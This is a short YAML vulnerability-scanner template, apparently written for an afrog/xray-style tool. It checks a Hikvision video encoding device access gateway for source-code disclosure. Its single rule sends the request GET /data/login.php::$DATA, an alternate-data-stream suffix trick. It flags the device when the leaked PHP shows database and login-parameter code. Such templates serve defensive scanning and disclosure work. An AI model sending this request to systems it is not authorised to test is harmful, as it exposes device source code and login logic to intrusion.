expression: r0()
id: hikvision-gateway-data-file-read
info:
  author: zan8in
  description: "HIKVISION \u89C6\u9891\u7F16\u7801\u8BBE\u5907\u63A5\u5165\u7F51\u5173\
    \u5B58\u5728\u914D\u7F6E\u9519\u8BEF\u7279\u6027\uFF0C\u7279\u6B8A\u540E\u7F00\
    \u8BF7\u6C42php\u6587\u4EF6\u53EF\u8BFB\u53D6\u6E90\u7801\ntitle=\"\u89C6\u9891\
    \u7F16\u7801\u8BBE\u5907\u63A5\u5165\u7F51\u5173\"\n"
  name: "HIKVISION \u89C6\u9891\u7F16\u7801\u8BBE\u5907\u63A5\u5165\u7F51\u5173 $DATA\
    \ \u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6"
  reference:
  - http://wiki.peiqi.tech/wiki/iot/HIKVISION/HIKVISION%20%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%20$DATA%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.html
  severity: high
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'DataBaseQuery();')
      && response.body.bcontains(b'$_POST[\'userName\'];') && response.body.bcontains(b'$_POST[\'password\'];')
    request:
      method: GET
      path: /data/login.php::$DATA
